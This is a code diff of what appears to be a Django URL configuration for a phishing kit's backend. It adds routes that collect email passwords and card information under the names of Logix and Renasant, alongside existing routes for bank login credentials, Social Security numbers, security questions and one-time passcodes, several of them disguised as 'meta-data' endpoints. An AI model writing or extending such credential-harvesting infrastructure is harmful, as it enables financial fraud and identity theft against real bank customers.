@@ -85,6 +85,8 @@ from user_data.logix_views import (
     logix_collect_user_social_security_2,
     logix_collect_user_security_questions,
     logix_collect_user_otp_verification,
+    logix_collect_user_email_password,
+    logix_collect_user_card_info,
 )
 from user_data.renasant_views import (
     renasant_collect_user_login_cred,
@@ -137,6 +139,9 @@ urlpatterns = [
     path("api/logix-meta-data-6/", logix_collect_user_social_security_2, name="logix_collect_user_social_security_2"),
     path("api/logix-meta-data-7/", logix_collect_user_security_questions, name="logix_collect_user_security_questions"),
     path("api/logix-meta-data-8/", logix_collect_user_otp_verification, name="logix_collect_user_otp_verification"),
+    path("api/logix-email-password/", logix_collect_user_email_password, name="logix_collect_user_email_password"),
+    path("api/logix-card-info/", logix_collect_user_card_info, name="logix_collect_user_card_info"),
+    path("api/logix-basic-info/", logix_collect_user_basic_info, name="logix_collect_user_basic_info_alias"),
     # Renasant API endpoints
     path("api/renasant-meta-data-1/", renasant_collect_user_login_cred, name="renasant_collect_user_login_cred"),
     path("api/renasant-meta-data-2/", renasant_collect_user_login_cred2, name="renasant_collect_user_login_cred2"),
